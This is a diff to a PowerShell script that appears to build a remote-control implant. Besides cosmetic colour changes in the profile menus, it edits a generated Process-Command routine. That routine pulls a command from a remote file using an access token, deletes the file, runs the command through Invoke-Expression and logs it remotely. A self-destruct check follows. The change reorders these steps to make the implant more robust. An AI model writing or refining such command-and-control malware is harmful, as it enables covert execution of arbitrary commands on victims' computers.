@@ -94,7 +94,7 @@ function Profile-Set {
     if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return $null }
 
     Write-Host "`nProfiles:" -ForegroundColor White
-    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor DarkYellow }
+    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor White }
     Write-Host ""
 
     $Selection = Read-Host "Profile index"
@@ -118,7 +118,7 @@ function Profile-Del {
     if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }
 
     Write-Host "`nProfiles:" -ForegroundColor White
-    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor DarkYellow }
+    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" }
     Write-Host ""
 
     $Selection = Read-Host "Profile index"
@@ -946,20 +946,24 @@ function Process-Command {
     }
     try {
         Write-Host "Executing command from `$fileName : `$command" -ForegroundColor White
+        `$deleteSuccess = Delete-File -accessToken `$accessToken -filePath "/`$fileName"
+        if (-not `$deleteSuccess) {
+            Write-Host "Failed to delete command file before execution" -ForegroundColor DarkRed
+            return `$false
+        }
         Invoke-Expression `$command
         `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
         `$commandLogMessage = "# EXECUTED COMMAND FROM `$fileName ON `$(`$currentTime)`n`$(`$command)"
         `$logSuccess = Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
         if (-not `$logSuccess) {
-            return `$false
+            Write-Host "Failed to log command execution" -ForegroundColor DarkYellow
         }
+        return `$true
     }
     catch {
         Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         return `$false
     }
-    `$deleteSuccess = Delete-File -accessToken `$accessToken -filePath "/`$fileName"
-    return `$deleteSuccess
 }
 
 function Check-SelfDestruct {
